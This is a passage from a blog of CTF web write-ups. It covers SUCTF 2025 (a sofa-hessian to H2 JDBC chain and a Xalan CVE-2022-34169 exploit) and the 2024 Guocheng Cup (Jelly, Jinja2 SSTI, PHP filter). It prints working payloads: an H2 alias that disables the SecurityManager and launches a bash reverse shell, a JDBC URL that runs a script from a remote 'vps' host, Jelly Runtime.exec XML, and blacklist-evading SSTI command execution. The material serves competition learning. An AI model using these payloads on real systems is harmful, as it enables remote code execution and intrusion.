class="hljs-variable">object</span> <span class="hljs-operator">=</span> hessian2Input.readObject();<br>        <span class="hljs-keyword">return</span> object.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题整体的思路不难想到，因为在依赖中可以明确的发现有<code>h2</code>和<code>jackson</code>依赖，从这也能推测得出出题人十之八九是要找一个<code>getter</code>到<code>jdbc</code>的链子，不会是打什么二次反序列化或者JNDI，<code>h2</code>肯定是最终的sink。这一步用<code>codeql</code>或者其他的静态分析工具就会很快得出结果。</p><p>第二步是对<code>securityManager</code>的绕过，这有两种思路</p><ul><li>通过反序列化直接关闭<code>securityManager</code></li><li>写<code>so</code>加载进行二次利用</li></ul><p>这里是sofa的hessian，自带了一个反序列化类的黑名单，h2的相关database直接被ban了。所以我们需要自己找一个新的构造链来打。</p><p>这里找到的是<code>org.noear.solon.data.util.UnpooledDataSource</code>来调用<code>getConnection()</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">[JDBC Gadget] <br>&lt;org.noear.solon.data.util.UnpooledDataSource: java.sql.Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">()</span>&gt;<br> -&gt; &lt;java.sql.DriverManager: java.sql.Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(java.lang.String)</span>&gt;<br></code></pre></td></tr></table></figure><p>即</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">JSONObject.toString()-&gt;UnpooledDataSource.getConnection()-&gt;h2RCE<br></code></pre></td></tr></table></figure><p>第二点就是绕这个<code>securityManager</code>，可以</p><ul><li>通过反序列化直接关闭 securityManager</li><li>写 so 加载进行二次利用</li></ul><p><code>SecurityManager</code>的限制可以直接调用<code>System.setSecurityManager(null); </code></p><p>而且传参别看走眼了，这里传的不是hello是data。。。</p><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>来自Syclover战队的wp：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> ALIAS GSBPPP12 <span class="hljs-keyword">AS</span> $$ String shellexec(String cmd) throws java.io.IOException &#123; System.setSecurityManager(<span class="hljs-keyword">null</span>);java.util.Scanner s <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> java.util.Scanner(Runtime.getRuntime().<span class="hljs-keyword">exec</span>(cmd).getInputStream()).useDelimiter(&quot;\\A&quot;); <span class="hljs-keyword">return</span> s.hasNext() ? s.next() : &quot;&quot;;  &#125;$$;<span class="hljs-keyword">CALL</span> GSBPPP12(<span class="hljs-string">&#x27;bash -c &#123;echo,aaa&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> org.noear.solon.data.util.UnpooledDataSource;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">UnpooledDataSource</span> <span class="hljs-variable">unpooledDataSource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UnpooledDataSource</span>(<span class="hljs-string">&quot;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM &#x27;http://vps/poc.sql&#x27;&quot;</span>,<span class="hljs-string">&quot;GSBP&quot;</span>,<span class="hljs-string">&quot;GSBP&quot;</span>,<span class="hljs-string">&quot;org.h2.Driver&quot;</span>);<br>        unpooledDataSource.setLogWriter(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;xx&quot;</span>, unpooledDataSource);<br><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> Util.hessianSerialize(jsonObject);<br>        System.out.println(payload);<br>        System.out.println(URLEncoder.encode(payload, <span class="hljs-string">&quot;UTF-8&quot;</span>));<br>        <span class="hljs-comment">//Util.hessianDeserialize(payload);</span><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250120202000237.png" alt="image-20250120202000237"></p><p>三折叠，怎么折都有面😋😋😋~~~</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250120201505921.png" alt="image-20250120201505921"></p><h2 id="SU-PWN"><a href="#SU-PWN" class="headerlink" title="SU_PWN"></a>SU_PWN</h2><p>注意到<code>xalan</code>依赖，且版本是 <code>2.7.2</code> 存在历史漏洞</p><p>找到这个CVE，网上有现成payload:</p><p>[Xalan-J XSLT整数截断漏洞利用构造(CVE-2022-34169)学习与扩展](<a href="https://alter1125.github.io/2023/02/19/Xalan-J">https://alter1125.github.io/2023/02/19/Xalan-J</a> XSLT整数截断漏洞利用构造(CVE-2022-34169)学习与扩展&#x2F;#CheckList)</p><p>但是直接打报错null,找到问题了,黑名单之后的问题在于他把我们传入的文件名进行了修改为null4位，但是项目给出的生成的文件都是6位的，</p><ul><li>由于文件名也会添加至常量池，为避免影响对其他常量位置造成变动，长度需保证一致(6)，<code>select -&gt; abcdef</code></li><li>运行前最好删除已生成的 <code>.class</code> 文件(文件内容发生变动则不用)</li></ul><p><a href="https://blog.noah.360.net/xalan-j-integer-truncation-reproduce-cve-2022-34169/">Xalan-J XSLT整数截断漏洞利用构造(CVE-2022-34169)</a></p><p>直接用这个师傅的github项目就能打，注意获取文件名设定为6位，filename是参数获取单独传参</p><p>本地utf16直接绕过出了，远程不出网curl dns外带没限制。按照官方说法是本来想让我们自己弄个重打<code>xslt</code>的内存马。。。</p><p>加上下面这个utf-16解析就可以绕过黑名单：</p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250124175516664.png" alt="image-20250124175516664"></p><p><img src="/2025/01/15/SUCTF2025-WEB-Learning/image-20250124175105749.png" alt="image-20250124175105749"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>好题啊好题。学到很多。XCTF才是真正的归宿吧。</p><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/WAtpKN7lMzzr0pGUX07juA">2025 SUCTF wp</a></p><p><a href="https://quick-mascara-699.notion.site/Syclover-SUCTF-WP-177370c566a481ff9a01ebed7f0c87f8?pvs=25#6a5e720153af42299f8369cb52974b47">Syclover-SUCTF-WP</a></p><p><a href="https://www.yuque.com/yulate/sd2qe4/af7s0tsqlccm5ipe#8b446194">ez-micronaut</a></p><p><a href="https://www.yuque.com/yulate/sd2qe4/lck4awbn2y0gslbr">SU_ez_solon</a></p><p><a href="https://blog.0xfff.team/posts/suctf_2025_writeup/#su_easyk8s_on_aliyunreally-very-easy">SUCTF 2025 Writeup ::</a></p><p><a href="https://github.com/team-su/SUCTF-2025/tree/main/web/sujava/writeup">SUCTF-2025&#x2F;web&#x2F;sujava&#x2F;writeup at main · team-su&#x2F;SUCTF-2025 · GitHub</a></p><p><a href="https://www.yuque.com/pupi1/kd6gkq/dx488t7mc375m83o">SU_PWN</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>国城杯初赛2024-WEB复现</title>
    <link href="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好久没打比赛了，网鼎杯虽然寄了，但是学到的东西还是有很多。这次随便注册了个号看了看，题目还是不错的，于是复现一手。</p><p>临近期末周了，这算是我这学期倒数第二次写CTF的wp了吧，最后一次还有个考前的软件安全国赛的初赛打打，然后就是一堆考试（晕</p><h2 id="Easy-Jelly"><a href="#Easy-Jelly" class="headerlink" title="Easy Jelly"></a>Easy Jelly</h2><p>看到这个题目当时想到的就是最近的一个Jelly漏洞：CVE-2024-4879的SSTI模板注入。</p><p>但是这个题其实不是这样的。而且这道题还可以直接XXE打非预期。。。</p><p>官方文档：<a href="https://commons.apache.org/proper/commons-jelly/">https://commons.apache.org/proper/commons-jelly/</a></p><p>这里官方wp给出的解释就是Jelly XML引擎解析导致的漏洞，在过滤了一些常见的Jelly标签的情况下仍然可以使用Jexl表达式实现RCE。</p><p>源码也很简单，直接想办法vps上放个反弹shell的xml然后传参uri就可以了：</p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233047132.png" class="" title="image-20241209233047132"><p>由于可以直接vps上放xml，所以他这个黑名单其实是形同虚设（没懂为啥要黑名单）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Boolean <span class="hljs-title function_">check</span><span class="hljs-params">(String uri)</span> <span class="hljs-keyword">throws</span> IOException, ParserConfigurationException, SAXException &#123;<br>        <span class="hljs-type">DocumentBuilderFactory</span> <span class="hljs-variable">dbf</span> <span class="hljs-operator">=</span> DocumentBuilderFactory.newInstance();<br>        dbf.setNamespaceAware(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">DocumentBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> dbf.newDocumentBuilder();<br>        <span class="hljs-type">Document</span> <span class="hljs-variable">doc</span> <span class="hljs-operator">=</span> builder.parse(uri);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag1</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;expr&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag2</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;import&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag3</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;include&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag4</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;invoke&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag5</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;invokeStatic&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag6</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;new&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag7</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;parse&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag8</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;set&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag9</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;setProperties&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag10</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;out&quot;</span>).getLength();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">tag11</span> <span class="hljs-operator">=</span> doc.getElementsByTagNameNS(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;useBean&quot;</span>).getLength();<br>        <span class="hljs-keyword">return</span> tag1 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag2 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag3 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag4 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag5 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag6 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag7 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag8 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag9 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag10 &lt;= <span class="hljs-number">0</span> &amp;&amp; tag11 &lt;= <span class="hljs-number">0</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>直接打payload就可以了（用的本地docker，官方靶机太鸡肋了，打半天打不通，还以为不出网）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:jelly</span> <span class="hljs-attr">xmlns:j</span>=<span class="hljs-string">&quot;jelly:core&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:getStatic</span> <span class="hljs-attr">var</span>=<span class="hljs-string">&quot;str&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.commons.jelly.servlet.JellyServlet&quot;</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;REQUEST&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:break</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;$&#123;str</span></span><br><span class="hljs-string"><span class="hljs-tag">.class</span></span><br><span class="hljs-string"><span class="hljs-tag">.forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance()</span></span><br><span class="hljs-string"><span class="hljs-tag">.getEngineByName(&#x27;js&#x27;)</span></span><br><span class="hljs-string"><span class="hljs-tag">.eval(&#x27;java.lang.Runtime.getRuntime().exec(<span class="hljs-symbol">&amp;quot;</span> RCE-Command<span class="hljs-symbol">&amp;quot;</span>)&#x27;)&#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">j:break</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">j:jelly</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或者：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:jelly</span> <span class="hljs-attr">xmlns:j</span>=<span class="hljs-string">&quot;jelly:core&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:getStatic</span> <span class="hljs-attr">var</span>=<span class="hljs-string">&quot;str&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.commons.jelly.servlet.JellyServlet&quot;</span> <span class="hljs-attr">field</span>=<span class="hljs-string">&quot;REQUEST&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">j:whitespace</span>&gt;</span>$&#123;str<br>.class<br>.forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance()<br>.getEngineByName(&#x27;js&#x27;)<br>.eval(&#x27;java.lang.Runtime.getRuntime().exec(<span class="hljs-symbol">&amp;quot;</span> RCE-Command<span class="hljs-symbol">&amp;quot;</span>)&#x27;)&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">j:whitespace</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">j:jelly</span>&gt;</span><br></code></pre></td></tr></table></figure><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233207570.png" class="" title="image-20241209233207570"><p>Jelly在执行Jexl表达式上非常灵活，可以在官方文档中看到expr标签的value属性是允许计算Jexl表达式的：</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233354352.png" alt="image-20241209233354352"></p><p>其执行逻辑位于<code>org.apache.commons.jelly.tags.core.ExprTag#doTag</code>方法：</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233447390.png" alt="image-20241209233447390"></p><p>如果你去翻看<code>CoreTagLibrary</code>类，会发现out标签的同样会到<code>org.apache.commons.jelly.tags.core.ExprTag#doTag</code>方法下处理</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233629735.png" alt="image-20241209233629735"></p><p>官方给了个思路，可以跟一跟：</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209233711981.png" alt="image-20241209233711981"></p><h2 id="Ez-Gallery"><a href="#Ez-Gallery" class="headerlink" title="Ez_Gallery"></a>Ez_Gallery</h2><p>弱密码admin&#x2F;123456，验证码纯数字，如果要识别验证码爆密码可以安bp的插件，不过多说了。</p><p>然后进去有个读文件的路由，显然可以任意文件读取，<code>/proc/self/cmdlin</code>e是可以看到app.py的位置的，然后直接读<code>/app/app.py</code>获得源码。</p><p>其他的没啥好看的,主要是这里：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">shell_view</span>(<span class="hljs-params">request</span>):<br>    <span class="hljs-keyword">if</span> request.session.get(<span class="hljs-string">&#x27;username&#x27;</span>) != <span class="hljs-string">&#x27;admin&#x27;</span>:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&quot;请先登录&quot;</span>, status=<span class="hljs-number">403</span>)<br><br>    expression = request.GET.get(<span class="hljs-string">&#x27;shellcmd&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>    blacklist_patterns = [<span class="hljs-string">r&#x27;.*length.*&#x27;</span>,<span class="hljs-string">r&#x27;.*count.*&#x27;</span>,<span class="hljs-string">r&#x27;.*[0-9].*&#x27;</span>,<span class="hljs-string">r&#x27;.*\..*&#x27;</span>,<span class="hljs-string">r&#x27;.*soft.*&#x27;</span>,<span class="hljs-string">r&#x27;.*%.*&#x27;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(re.search(pattern, expression) <span class="hljs-keyword">for</span> pattern <span class="hljs-keyword">in</span> blacklist_patterns):<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&#x27;wafwafwaf&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        result = jinja2.Environment(loader=jinja2.BaseLoader()).from_string(expression).render(&#123;<span class="hljs-string">&quot;request&quot;</span>: request&#125;)<br>        <span class="hljs-keyword">if</span> result != <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&#x27;success&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&#x27;error&#x27;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> Response(<span class="hljs-string">&#x27;error&#x27;</span>)<br></code></pre></td></tr></table></figure><p>一眼SSTI，但ban了数字和点号才是最伤的，很多命令给ban了，写内存马也不好写。</p><p>但是方法总比困难多，这里不写我那个烂方法了，又长又难看。。。而且这里没回显，也在考虑SSTI盲注的思路。</p><p>官方wp给出的是钩子函数的解法：</p><p>这里尝试内存马，但是添加路由的config 变量是局部变量，所以考虑其他和 config 无关的钩子函数，参考：<a href="https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html">https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html</a></p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209234209849.png" alt="image-20241209234209849"></p><p>利用 <code>request.add_response_callback</code> 钩子函数进行回显，构造：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler.__init__.__globals__.__builtins__[<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;request.add_response_callback(lambda request, response: setattr(response,&#x27;text&#x27;, __import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()))&quot;</span>,&#123;<span class="hljs-string">&#x27;request&#x27;</span>: request&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p>用<code>getattr</code>绕一下点号：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;exec&#x27;</span>](<span class="hljs-string">&quot;getattr(request,&#x27;add_response_callback&#x27;)(lambda request,response:setattr(response, &#x27;text&#x27;, getattr(getattr(__import__(&#x27;os&#x27;),&#x27;popen&#x27;)(&#x27;whoami&#x27;),&#x27;read&#x27;)()))&quot;</span>,&#123;<span class="hljs-string">&#x27;request&#x27;</span>: request&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209234305873.png" alt="image-20241209234305873"></p><p>还可以用回显头的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;cycler[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;setattr&#x27;</span>](cycler[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;sys&#x27;</span>)[<span class="hljs-string">&#x27;modules&#x27;</span>][<span class="hljs-string">&#x27;wsgiref&#x27;</span>][<span class="hljs-string">&#x27;simple_server&#x27;</span>][<span class="hljs-string">&#x27;ServerHandler&#x27;</span>],<span class="hljs-string">&#x27;http_version&#x27;</span>,cycler[<span class="hljs-string">&#x27;__init__&#x27;</span>][<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>)[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;whoami&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]())&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241209234341609.png" alt="image-20241209234341609"></p><p>而且赛后群里还有师傅给出一种方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum[<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;setattr&#x27;</span>]((((lipsum|attr(<span class="hljs-string">&#x27;__spec__&#x27;</span>))|attr(<span class="hljs-string">&#x27;__init__&#x27;</span>)|attr(<span class="hljs-string">&#x27;__globals__&#x27;</span>))[<span class="hljs-string">&#x27;sys&#x27;</span>]|attr(<span class="hljs-string">&#x27;modules&#x27;</span>))[<span class="hljs-string">&#x27;wsgiref&#x27;</span>]|attr(<span class="hljs-string">&#x27;simple_server&#x27;</span>)|attr(<span class="hljs-string">&#x27;ServerHandler&#x27;</span>),<span class="hljs-string">&#x27;server_so&#x27;</span>+<span class="hljs-string">&#x27;ftware&#x27;</span>,lipsum[<span class="hljs-string">&#x27;__globals__&#x27;</span>][<span class="hljs-string">&#x27;__builtins__&#x27;</span>][<span class="hljs-string">&#x27;__import__&#x27;</span>](<span class="hljs-string">&#x27;os&#x27;</span>)[<span class="hljs-string">&#x27;popen&#x27;</span>](<span class="hljs-string">&#x27;/readflag&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]())&#125;&#125;<br></code></pre></td></tr></table></figure><p>只是这种方法也需要打盲注，后续不多说了。这里的<code>lipsum</code>可以关注一下，用法很多，也适用于很多奇技淫巧。</p><h2 id="signal"><a href="#signal" class="headerlink" title="signal"></a>signal</h2><p>从302跳转到Fastcgi的SSRF。</p><p>但是平台靶机上不了外网，太傻逼了。</p><p>dirsearch能扫到index.php.swp文件，vim -r读一下获得guest登录账号密码。</p><p>然后登录进去能得到一个文件读取路由，直接读只有个假flag。猜测读真flag还得拿shell提权。</p><p>读文件这里用到的是二次URL编码，二次URL编码能够利用filter读取到admin.php的源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35/resource=admin.php</span><br></code></pre></td></tr></table></figure><p>这里其实filter-chain非预期直接可以打了，可以看看网上其他人的wp。</p><p><img src="/2024/12/09/%E5%9B%BD%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B2024-WEB%E5%A4%8D%E7%8E%B0/image-20241212193455018.png" alt="image-20241212193455018"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 